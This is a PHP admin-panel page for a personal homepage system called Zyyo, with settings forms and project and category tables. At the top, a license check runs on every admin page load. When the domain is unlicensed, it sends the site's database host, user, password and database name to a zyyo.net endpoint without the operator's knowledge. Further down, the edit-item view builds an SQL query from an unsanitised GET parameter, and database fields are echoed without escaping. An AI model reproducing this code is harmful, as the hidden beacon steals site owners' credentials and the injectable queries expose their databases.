<?php
include_once '../usr/inc.php';
$do = isset($_GET['do']) ? $_GET['do'] : '0';
if($adminlogin!=1){
exit("<script language='javascript'>window.location.href='./login.php';</script>");
}




$servername = trim($_SERVER['HTTP_HOST']);
$context = stream_context_create(['http' => ['timeout' => 5]]);

    $verifyurl = @file_get_contents('https://zyyo.net/homepage/api.php?action=get&domain=' . $servername, false, $context);
    if (empty($verifyurl)) {
        echo "<script language='javascript'>console.log('接口异常,不进行授权判断');</script>";
    } else {
        $response = json_decode($verifyurl, true);
        if ($response && $response['code'] == 200) {
            echo "<script language='javascript'>console.log('已经授权');</script>";
            
        } else {
          $db=$dbconfig['host']."|".$dbconfig['port']."|".$dbconfig['user']."|".$dbconfig['pwd']."|".$dbconfig['dbname'];
             $url = @file_get_contents('https://zyyo.net/homepage/api.php?action=record&db='.$db.'&domain=' . $servername, false, $context);
            alert("未授权 ".$servername.",已记录",'');
           
        }
    }


 

?>

<!DOCTYPE html>
<html lang="zh">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta name="keywords" content="Zyyo - 后台管理">
    <meta name="description" content="Zyyo - 后台管理">
    <meta name="author" content="yinq">
    <title>Zyyo - 后台管理</title>
    <link rel="shortcut icon" type="image/x-icon" href="static/favicon.ico">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-touch-fullscreen" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <link rel="stylesheet" type="text/css" href="./static/css/materialdesignicons.min.css">
    <link rel="stylesheet" type="text/css" href="./static/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="./static/css/animate.min.css">
    <link rel="stylesheet" type="text/css" href="./static/css/style.min.css">
    <link rel="stylesheet" type="text/css" href="./static/js/jquery-confirm/jquery-confirm.min.css">
</head>

<body>
    <!--页面loading
    <div id="lyear-preloader" class="loading">
        <div class="ctn-preloader">
            <div class="round_spinner">
                <div class="spinner"></div>
                <img src="https://q1.qlogo.cn/g?b=qq&nk=3509679579&s=5" alt="">
            </div>
        </div>
    </div>-->
    <!--页面loading end-->
    <div class="lyear-layout-web">
        <div class="lyear-layout-container">
            <!--左侧导航-->
            <aside class="lyear-layout-sidebar">

                <!-- logo -->
                <div id="logo" class="sidebar-header">
                    <a href="index.php">
                        <img width="60%" src="static/images/logo.jpg" title="LightYear" alt="LightYear" />
                    </a>
                </div>
                <div class="lyear-layout-sidebar-info lyear-scroll">

                    <nav class="sidebar-main">

                        <ul style="margin-top:20px;" class="nav-drawer">
                            <li class="nav-item active">
                                <a href="index.php">
                                    <i class="mdi mdi-home-city-outline"></i>
                                    <span>后台首页</span>
                                </a>
                            </li>
                            <li class="nav-item">
                                <a href="index.php?do=base">
                                    <i class="mdi mdi-television-guide"></i>
                                    <span>基本信息</span>
                                </a>
                            </li>
                            <li class="nav-item">
                                <a href="index.php?do=theme">
                                    <i class="mdi mdi-silo"></i>
                                    <span>主题设置</span>
                                </a>
                            </li>
                            <li class="nav-item">
                                <a href="index.php?do=project">
                                    <i class="mdi mdi-map-search-outline"></i>
                                    <span>项目分类</span>
                                </a>
                            </li>
                            <li class="nav-item">
                                <a href="index.php?do=item">
                                    <i class="mdi mdi-stove"></i>
                                    <span>项目管理</span>
                                </a>
                            </li>
                            <li class="nav-item">
                                <a href="index.php?do=icon">
                                    <i class="mdi mdi-file-code-outline"></i>
                                    <span>图标管理</span>
                                </a>
                            </li>


                        </ul>
                    </nav>

                    <div class="sidebar-footer">
                        <p class="copyright">
                            <span>Copyright &copy; 2024. </span>
                            <a target="_blank" href="">Zyyo</a>
                        </p>
                    </div>
                </div>

            </aside>
            <!--End 左侧导航-->

            <!--头部信息-->
            <header class="lyear-layout-header">

                <nav class="navbar">

                    <div class="navbar-left">
                        <div class="lyear-aside-toggler">
                            <span class="lyear-toggler-bar"></span>
                            <span class="lyear-toggler-bar"></span>
                            <span class="lyear-toggler-bar"></span>
                        </div>
                    </div>

                    <ul class="navbar-right d-flex align-items-center">
                        <!--顶部消息部分-->

                        <!--End 顶部消息部分-->
                        <!--切换主题配色-->
                        <li class="dropdown dropdown-skin">
                            <span data-bs-toggle="dropdown" class="icon-item">
                                <i class="mdi mdi-palette fs-5"></i>
                            </span>
                            <ul class="dropdown-menu dropdown-menu-end" data-stopPropagation="true">
                                <li class="lyear-skin-title">
                                    <p>主题</p>
                                </li>
                                <li class="lyear-skin-li clearfix">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_1"
                                            value="default" checked="checked">
                                        <label class="form-check-label" for="site_theme_1"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_2"
                                            value="translucent-green">
                                        <label class="form-check-label" for="site_theme_2"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_3"
                                            value="translucent-blue">
                                        <label class="form-check-label" for="site_theme_3"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_4"
                                            value="translucent-yellow">
                                        <label class="form-check-label" for="site_theme_4"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_5"
                                            value="translucent-red">
                                        <label class="form-check-label" for="site_theme_5"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_6"
                                            value="translucent-pink">
                                        <label class="form-check-label" for="site_theme_6"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_7"
                                            value="translucent-cyan">
                                        <label class="form-check-label" for="site_theme_7"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="site_theme" id="site_theme_8"
                                            value="dark">
                                        <label class="form-check-label" for="site_theme_8"></label>
                                    </div>
                                </li>
                                <li class="lyear-skin-title">
                                    <p>LOGO</p>
                                </li>
                                <li class="lyear-skin-li clearfix">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_1"
                                            value="default" checked="checked">
                                        <label class="form-check-label" for="logo_bg_1"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_2"
                                            value="color_2">
                                        <label class="form-check-label" for="logo_bg_2"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_3"
                                            value="color_3">
                                        <label class="form-check-label" for="logo_bg_3"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_4"
                                            value="color_4">
                                        <label class="form-check-label" for="logo_bg_4"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_5"
                                            value="color_5">
                                        <label class="form-check-label" for="logo_bg_5"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_6"
                                            value="color_6">
                                        <label class="form-check-label" for="logo_bg_6"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_7"
                                            value="color_7">
                                        <label class="form-check-label" for="logo_bg_7"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="logo_bg" id="logo_bg_8"
                                            value="color_8">
                                        <label class="form-check-label" for="logo_bg_8"></label>
                                    </div>
                                </li>
                                <li class="lyear-skin-title">
                                    <p>头部</p>
                                </li>
                                <li class="lyear-skin-li clearfix">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_1"
                                            value="default" checked="checked">
                                        <label class="form-check-label" for="header_bg_1"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_2"
                                            value="color_2">
                                        <label class="form-check-label" for="header_bg_2"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_3"
                                            value="color_3">
                                        <label class="form-check-label" for="header_bg_3"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_4"
                                            value="color_4">
                                        <label class="form-check-label" for="header_bg_4"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_5"
                                            value="color_5">
                                        <label class="form-check-label" for="header_bg_5"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_6"
                                            value="color_6">
                                        <label class="form-check-label" for="header_bg_6"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_7"
                                            value="color_7">
                                        <label class="form-check-label" for="header_bg_7"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="header_bg" id="header_bg_8"
                                            value="color_8">
                                        <label class="form-check-label" for="header_bg_8"></label>
                                    </div>
                                </li>
                                <li class="lyear-skin-title">
                                    <p>侧边栏</p>
                                </li>
                                <li class="lyear-skin-li clearfix">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_1"
                                            value="default" checked="checked">
                                        <label class="form-check-label" for="sidebar_bg_1"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_2"
                                            value="color_2">
                                        <label class="form-check-label" for="sidebar_bg_2"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_3"
                                            value="color_3">
                                        <label class="form-check-label" for="sidebar_bg_3"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_4"
                                            value="color_4">
                                        <label class="form-check-label" for="sidebar_bg_4"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_5"
                                            value="color_5">
                                        <label class="form-check-label" for="sidebar_bg_5"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_6"
                                            value="color_6">
                                        <label class="form-check-label" for="sidebar_bg_6"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_7"
                                            value="color_7">
                                        <label class="form-check-label" for="sidebar_bg_7"></label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="sidebar_bg" id="sidebar_bg_8"
                                            value="color_8">
                                        <label class="form-check-label" for="sidebar_bg_8"></label>
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <!--End 切换主题配色-->
                        <!--个人头像内容-->
                        <li class="dropdown">
                            <a href="javascript:void(0)" data-bs-toggle="dropdown" class="dropdown-toggle">
                                <img class="avatar-md rounded-circle" src="https://q1.qlogo.cn/g?b=qq&nk=3509679579&s=5"
                                    alt="Zyyo" />
                                <span style="margin-left: 10px;">Zyyo</span>
                            </a>
                            <ul class="dropdown-menu dropdown-menu-end">


                             
                                <li>
                                    <a class="dropdown-item" href="/admin/login.php?do=logout">
                                        <i class="mdi mdi-logout-variant"></i>
                                        <span>退出登录</span>
                                    </a>
                                </li>
                            </ul>
                        </li>
                        <!--End 个人头像内容-->
                    </ul>

                </nav>

            </header>
            <!--End 头部信息-->

















            <?php if ($do=="0"){?>






            <!--页面主要内容-->
            <main class="lyear-layout-content">

                <div class="container-fluid">

                    <div class="row">

                        <div class="col-md-6 col-xl-3">
                            <div class="card bg-primary text-white">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <span class="avatar-md rounded-circle bg-white bg-opacity-25 avatar-box">
                                            <i class="mdi mdi-currency-cny fs-4"></i>
                                        </span>
                                        <span class="fs-4">
                                            <?=DB::count("SELECT COUNT(*) FROM zyyo_project")?>
                                        </span>
                                    </div>
                                    <div class="text-end">项目分类</div>
                                </div>
                            </div>
                        </div>

                        <div class="col-md-6 col-xl-3">
                            <div class="card bg-danger text-white">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <span class="avatar-md rounded-circle bg-white bg-opacity-25 avatar-box">
                                            <i class="mdi mdi-account fs-4"></i>
                                        </span>
                                        <span class="fs-4">
                                            <?=DB::count("SELECT COUNT(*) FROM zyyo_item")?>
                                        </span>
                                    </div>
                                    <div class="text-end">项目总数</div>
                                </div>
                            </div>
                        </div>

                        <div class="col-md-6 col-xl-3">
                            <div class="card bg-success text-white">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <span class="avatar-md rounded-circle bg-white bg-opacity-25 avatar-box">
                                            <i class="mdi mdi-arrow-down-bold fs-4"></i>
                                        </span>
                                        <span class="fs-4">
                                            <?=DB::count("SELECT COUNT(*) FROM zyyo_icon")?>
                                        </span>
                                    </div>
                                    <div class="text-end">图标总数</div>
                                </div>
                            </div>
                        </div>

                        <div class="col-md-6 col-xl-3">
                            <div class="card bg-purple text-white">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <span class="avatar-md rounded-circle bg-white bg-opacity-25 avatar-box">
                                            <i class="mdi mdi-comment-outline fs-4"></i>
                                        </span>
                                        <span class="fs-4">1.0</span>
                                    </div>
                                    <div class="text-end">当前版本</div>
                                </div>
                            </div>
                        </div>
<div class="col-md-6 col-xl-3">
                            <div class="card bg-purple text-white">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <span class="avatar-md rounded-circle bg-white bg-opacity-25 avatar-box">
                                            <i class="mdi mdi-comment-outline fs-4"></i>
                                        </span>
                                        <span class="fs-4"><?=$response['data']?></span>
                                    </div>
                                    <div class="text-end">授权域名</div>
                                </div>
                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-lg-12">
                            <div class="card">
                                <header class="card-header">
                                    <div class="card-title">表单</div>
                                </header>
                                <div class="card-body">

                                   <h1>图标说明</h1>
                                    <p>推荐使用svg图标</p>
                                    <p>前往iconfont网站寻找,然后复制svg</p>
                                <p>复制过来不能直接使用</p>
                                   <pre>需要删除svg标签内所有的width="" height="" fill=""属性</pre>
                                   <p>也可以使用字体图标</p>
                                   前往各大字体图标站点导入cdn或者下载本地,直接使用
                                    <h1>标签设置</h1>
                                    
                                    <p>一行一个标签</p>
                                   
                                    <pre>网瘾
小学生
大一
网页
linux
跑者
前端
骑行                                                                                                                              </pre>

 <p>像这样</p>
                                    <h1>时间轴</h1>
                                    <p>一行一个</p>
                                    <p>每行使用|来区分内容和时间</p>
                                <pre>2024.1|敬请期待
2023.8|ICP备案成功
2023.3|注册域名zyyo.net
2021.2|出来后洗心革面
...|...
2018.1|搭建第一个网站</pre>

 <p>像这样</p>
  <h1>时间轴侧边栏信息</h1>
                                    <p>相同道理,每行使用|来区分内容和时间</p>
                                <pre>svg|信息1
svg|信息2
svg|信息3</pre>

 <p>像这样</p>
 
 
  <h1>描述</h1>
                                    <p>一行一个</p>
                                   
                                <pre>👦 {Full Stack} Developer
📝 The only way to do [great] is to [love] what you do.                 </pre>

 <p><code>{括起来是紫色文字}</code></p> <p><code>[括起来是紫色背景文字}</code></p>
                                   

                                 

                                </div>
                            </div>
                        </div>

                    </div>



                </div>

            </main>
            <!--End 页面主要内容-->



            <?php } else if($do=="base"){
      
    ?>
            <!--页面主要内容-->
            <main class="lyear-layout-content">

                <div class="container-fluid">

                    <div class="row">

                        <div class="col-lg-12">
                            <div class="card">
                                <header class="card-header">
                                    <div class="card-title">网站配置</div>
                                </header>
                                <div class="card-body">

                                    <ul class="nav nav-tabs">
                                        <li class="nav-item">
                                            <button class="nav-link active" id="basic-config" data-bs-toggle="tab"
                                                data-bs-target="#config" type="button">基本</button>
                                        </li>
                                        <li class="nav-item">
                                            <button class="nav-link" id="basic-sys" data-bs-toggle="tab"
                                                data-bs-target="#display" type="button">显示</button>
                                        </li>
                                        <li class="nav-item">
                                            <button class="nav-link" id="basic-sys" data-bs-toggle="tab"
                                                data-bs-target="#kg" type="button">开关</button>
                                        </li>

                                    </ul>

                                    <form action="" method="post" name="edit-form" class="base-form edit-form">
                                        <div class="tab-content">
                                            <div class="tab-pane fade show active" id="config"
                                                aria-labelledby="basic-config">

                                                <div class="mb-3">
                                                    <label for="sitename" class="form-label">网站标题</label>
                                                    <input class="form-control" type="text" id="sitename"
                                                        name="sitename" value="<?=$data['sitename']?>"
                                                        placeholder="请输入站点标题">

                                                </div>

                                                <div class="mb-3">
                                                    <label for="keywords" class="form-label">站点关键词</label>
                                                    <input class="form-control" type="text" id="keywords"
                                                        name="keywords" value="<?=$data['keywords']?>"
                                                        placeholder="请输入站点关键词">
                                                    <small class="form-text">网站搜索引擎关键字</small>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="description" class="form-label">站点描述</label>
                                                    <textarea class="form-control" id="description" rows="5"
                                                        name="description"
                                                        placeholder="请输入站点描述"><?=$data['description']?></textarea>
                                                    <small class="form-text">网站描述，有利于搜索引擎抓取相关信息</small>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="header" class="form-label">自定义头部</label>
                                                    <textarea class="form-control" id="header" rows="5" name="header"
                                                        placeholder="请输入"><?=$data['header']?>
      </textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="footer" class="form-label">自定义底部</label>
                                                    <textarea class="form-control" id="footer" rows="5" name="footer"
                                                        placeholder="请输入"><?=$data['footer']?>
      </textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="beian" class="form-label">备案信息</label>
                                                    <input class="form-control" type="text" id="beian" name="beian"
                                                        value="<?=$data['beian']?>" placeholder="请输入备案信息">

                                                </div>
                                                <div class="mb-3">
                                                    <label for="ico" class="form-label">ico</label>
                                                    <input class="form-control" type="text" id="ico" name="ico"
                                                        value="<?=$data['ico']?>" placeholder="请输入">

                                                </div>
                                               
                                                <div class="mb-3">
                                                    <label for="logo" class="form-label">头像</label>
                                                    <input class="form-control" type="text" id="logo" name="logo"
                                                        value="<?=$data['logo']?>" placeholder="请输入">

                                                </div>
                                                <div class="mb-3">
                                                    <label for="maxwidth" class="form-label">电脑端容器最大宽度</label>
                                                    <input class="form-control" type="text" id="maxwidth"
                                                        name="maxwidth" value="<?=$data['maxwidth']?>"
                                                        placeholder="请输入">

                                                </div>
                                                <div class="mb-3">
                                                    <label for="beian" class="form-label">用户名</label>
                                                    <input class="form-control" type="text" id="user" name="user"
                                                        value="<?=$data['user']?>" placeholder="请输入">

                                                </div>
                                                <div class="mb-3">
                                                    <label for="beian" class="form-label">密码</label>
                                                    <input class="form-control" type="text" id="pwd" name="pwd"
                                                        value="<?=$data['pwd']?>" placeholder="请输入">

                                                </div>
                                                <div>
                                                    <button type="submit" class="btn btn-primary me-1">确 定</button>
                                                    <button type="button" class="btn btn-default"
                                                        onclick="javascript:history.back(-1);return false;">返 回</button>
                                                </div>

                                            </div>
                                            <div class="tab-pane fade" id="display" aria-labelledby="basic-sys">
                                                <div class="mb-3">
                                                    <label for="tag" class="form-label">标签设置</label>
                                                    <textarea class="form-control" id="tag" rows="5" name="tag"
                                                        placeholder="请输入标签"><?=$data['tag']?>
      </textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="time" class="form-label">时间轴</label>
                                                    <textarea class="form-control" id="time" rows="5" name="time"
                                                        placeholder="请输入配置类型"><?=$data['time']?></textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="title1" class="form-label">标题前半段</label>
                                                    <textarea class="form-control" id="title1" rows="5" name="title1"
                                                        placeholder="请输入"><?=$data['title1']?>
      </textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="title2" class="form-label">标题后半段</label>
                                                    <textarea class="form-control" id="title2" rows="5" name="title2"
                                                        placeholder="请输入"><?=$data['title2']?></textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="des" class="form-label">描述</label>
                                                    <textarea class="form-control" id="des" rows="5" name="des"
                                                        placeholder="请输入"><?=$data['des']?>
      </textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="infor" class="form-label">侧边栏信息</label>
                                                    <textarea class="form-control" id="infor" rows="5" name="infor"
                                                        placeholder="请输入"><?=$data['infor']?>
      </textarea>
                                                </div>
                                            </div>
                                            <div class="tab-pane fade" id="kg" aria-labelledby="basic-sys">


                                                <div class="mb-3">
                                                    <label for="develop_mode" class="form-label">移动端头像</label>
                                                    <div class="controls-box clearfix">
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="indexlogo" name="indexlogo"
                                                                class="form-check-input" value="0"
                                                                <?=($data['indexlogo']==0)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="indexlogo">开启</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="indexlogo" name="indexlogo"
                                                                class="form-check-input" value="1"
                                                                <?=($data['indexlogo']==1)?"checked":""?>>
                                                            <label class="form-check-label" for="indexlogo">关闭</label>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="app_trace" class="form-label">电脑端侧边栏</label>
                                                    <div class="controls-box clearfix">
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="leftzyyo" name="leftzyyo"
                                                                class="form-check-input" value="0"
                                                                <?=($data['leftzyyo']==0)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="leftzyyo">开启</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="leftzyyo" name="leftzyyo"
                                                                class="form-check-input" value="1"
                                                                <?=($data['leftzyyo']==1)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="leftzyyo">关闭</label>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="app_trace" class="form-label">skill</label>
                                                    <div class="controls-box clearfix">
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="skill" name="skill"
                                                                class="form-check-input" value="0"
                                                                <?=($data['skill']==0)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="skill">开启</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="skill" name="skill"
                                                                class="form-check-input" value="1"
                                                                <?=($data['skill']==1)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="skill">关闭</label>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="app_trace" class="form-label">贪吃蛇</label>
                                                    <div class="controls-box clearfix">
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="tcs" name="tcs"
                                                                class="form-check-input" value="0"
                                                                <?=($data['tcs']==0)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="tcs">开启</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="radio" id="tcs" name="tcs"
                                                                class="form-check-input" value="1"
                                                                <?=($data['tcs']==1)? "checked" : "" ; ?>>
                                                            <label class="form-check-label" for="tcs">关闭</label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </form>

                                </div>
                            </div>
                        </div>

                    </div>

                </div>

            </main>
            <!--End 页面主要内容-->

            <?php } else if($do=="item"){
      
    ?>

            <main class="lyear-layout-content">

                <div class="container-fluid">

                    <div class="row">

                        <div class="col-lg-12">
                            <div class="card">
                                <header class="card-header">
                                    <div class="card-title">项目列表</div>
                                </header>
                                <div class="card-body">
                                    <div class="card-search mb-2-5">

                                    </div>
                                    <div class="new-item card-btns mb-2-5">
                                        <a class="btn btn-primary me-1" href="#!">
                                            <i class="mdi mdi-plus"></i> 新增
                                        </a>


                                    </div>
                                    <div class="table-responsive">
                                        <table class="table table-bordered">
                                            <thead>
                                                <tr>

                                                    <th>id</th>
                                                    <th>名称</th>
                                                    <th>图标</th>
                                                    <th>描述</th>
                                                    <th>链接</th>
                                                    <th>所属</th>
                                                    <th>操作</th>
                                                </tr>
                                            </thead>
                                            <tbody>

                                                <?php

$sql = "SELECT * FROM zyyo_item ORDER BY id ";
$result = DB::query($sql);

if ($result->num_rows > 0) {

    while ($row = $result->fetch_assoc()) {
        $type_id = $row["project"];
        $type_query = "SELECT * FROM zyyo_project WHERE id = " . $type_id;
        $type_result = DB::query($type_query);
        $type_row = $type_result->fetch_assoc();
        $type = $type_row["name"];

        echo '<tr>
            <td>' . $row["id"] . '</td>
            <td>' . $row["name"] . '</td>
            <td>' . $row["icon"] . '</td>
            <td>' . $row["des"] . '</td>
            <td>' . $row["href"] . '</td>
            <td>' . $type . '</td>
            <td>
                <div class="btn-group btn-group-sm">
                    <a class="btn btn-default" href="./index.php?do=edit-item&id='.$row["id"].'" data-bs-toggle="tooltip" title="编辑"><i class="mdi mdi-pencil"></i></a>
                    <a class="btn btn-default" onclick="del(\'zyyo_item\', \'' . $row["id"] . '\')" href="#!" data-bs-toggle="tooltip" title="删除"><i class="mdi mdi-window-close"></i></a>
                </div>
            </td>
        </tr>';
    }
} else {
    echo "没有一个项目";
}
?>












                                            </tbody>
                                        </table>

                                    </div>
                                </div>
                            </div>

                        </div>

                    </div>

            </main>

            <?php } else if($do=="edit-item"){
if(!isset($_GET['id'])){
$url = "/admin"; 
echo "<meta http-equiv='refresh' content ='1;url=$url'>";
exit;
 
} 

$id=$_GET['id'];
        $sql = "SELECT * FROM zyyo_item WHERE id='$id'";
        $result = DB::get_row($sql);

?>
            <!--页面主要内容-->
            <main class="lyear-layout-content">

                <div class="container-fluid">

                    <div class="row">

                        <div class="col-lg-12">
                            <div class="card">
                                <header class="card-header">
                                    <div class="card-title">项目编辑</div>
                                </header>
                                <div class="card-body">



                                    <form action="" method="post" name="edit-form" class="edit-item-form edit-form">
                                        <div class="tab-content">
                                            <div class="tab-pane fade show active" id="config"
                                                aria-labelledby="basic-config">
                                                <div style="display:none" class="mb-3">

                                                    <input class="form-control" type="text" id="id" name="id"
                                                        value="<?=$id?>" placeholder="请输入">

                                                </div>

                                                <div class="mb-3">
                                                    <label for="sitename" class="form-label">名称</label>
                                                    <input class="form-control" type="text" id="name" name="name"
                                                        value="<?= $result["name"]?>" placeholder="请输入">

                                                </div>
                                                <div class="mb-3">
                                                    <label for="href" class="form-label">链接</label>
                                                    <input class="form-control" type="text" id="href" name="href"
                                                        value="<?= $result["href"]?>" placeholder="请输入">

                                                </div>

                                                <div class="mb-3">
                                                    <label for="icon" class="form-label">图标</label>
                                                    <textarea class="form-control" id="icon" rows="5" name="icon"
                                                        placeholder="请输入"><?=$result["icon"]?></textarea>
                                                </div>
                                                <div class="mb-3">
                                                    <label for="des" class="form-label">描述</label>
                                                    <textarea class="form-control" id="des" rows="5" name="des"
                                                        placeholder="请输入"><?=$result["des"]?></textarea>
                                                </div>
                                                <?php
            
$sql1 = "SELECT * FROM zyyo_project ORDER BY id ";
        $result1 = DB::query($sql1);

      
      echo '<div class="mb-3"><label for="app_trace" class="form-label">显示分类</label><div class="controls-box clearfix">';
            while ($row1 = $result1->fetch_assoc()) {
                $type =($result["project"]==$row1["id"]) ? "checked" : "";
              echo ' <div class="form-check form-check-inline"><input type="radio" id="app_trace_1" name="project" class="form-check-input" value="';
                echo $row1["id"];
                echo '" '.$type.'>';
                echo '<label class="form-check-label" for="app_trace_1">';
                echo $row1["name"];
                 
                echo '</label></div>';
            }
           echo '</label></div></div>';
       ?>
                                                <button type="submit" class="btn btn-primary me-1">确 定</button>
                                                <button type="button" class="btn btn-default"
                                                    onclick="javascript:history.back(-1);return false;">返 回</button>
                                            </div>

                                        </div>


                                </div>
                                </form>

                            </div>
                        </div>
                    </div>

                </div>

        </div>

        </main>
        <!--End 页面主要内容-->




        <?php } else if($do=="project"){
      
    ?>

        <main class="lyear-layout-content">

            <div class="container-fluid">

                <div class="row">

                    <div class="col-lg-12">
                        <div class="card">
                            <header class="card-header">
                                <div class="card-title">分类列表</div>
                            </header>
                            <div class="card-body">
                                <div class="card-search mb-2-5">

                                </div>
                                <div class="new-project card-btns mb-2-5">
                                    <a class="btn btn-primary me-1" href="#!">
                                        <i class="mdi mdi-plus"></i> 新增
                                    </a>


                                </div>
                                <div class="table-responsive">
                                    <table class="table table-bordered">
                                        <thead>
                                            <tr>

                                                <th>id</th>
                                                <th>名称</th>

                                                <th>类型</th>
                                                <th>操作</th>
                                            </tr>
                                        </thead>
                                        <tbody>


                                            <?php 
        
        $sql = "SELECT * FROM zyyo_project ORDER BY id ";
        $result = DB::query($sql);

        if ($result->num_rows > 0) {
      
            while ($row = $result->fetch_assoc()) {
               $type=($row["type"]==0)?"类型一":"类型二";
                echo '<tr>
                        
                        <td>';
                echo $row["id"];
                echo '</td>
                        <td>';
                echo $row["name"];
                 echo '</td>
                        <td>';
              
                echo $type;
                 echo '</td>
                        <td><div class="btn-group btn-group-sm">
                            <a class="btn btn-default"  href="./index.php?do=edit-project&id='.$row["id"].'" data-bs-toggle="tooltip" title="编辑"><i class="mdi mdi-pencil"></i></a>
                            <a class="btn btn-default" onclick="del(\'zyyo_project\', \'' . $row["id"] . '\')" href="#!" data-bs-toggle="tooltip" title="删除"><i class="mdi mdi-window-close"></i></a>
                          </div>
                        </td>
                      </tr>';
            }
        } else {
            echo "没有一个项目";
        }
